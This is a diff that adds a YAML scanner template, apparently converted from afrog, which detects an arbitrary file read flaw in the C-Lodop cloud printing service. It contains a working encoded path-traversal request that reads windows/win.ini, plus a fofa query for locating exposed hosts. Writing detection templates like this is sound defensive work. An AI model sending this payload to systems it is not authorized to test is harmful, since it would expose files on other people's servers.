@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini'
+id: c-lodop-read-file
+info:
+  author: hansi
+  description: |-
+    C-Lodop打印服务系统是一款云打印软件。 C-Lodop打印服务系统存在任意文件读取漏洞，攻击者可利用漏洞获取敏感信息。
+    fofa: title="Welcome to C-Lodop"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: C-Lodop 云打印机系统平台任意文件读取漏洞
+  severity: high
+  tags: c-lodop,readfile,argus-import
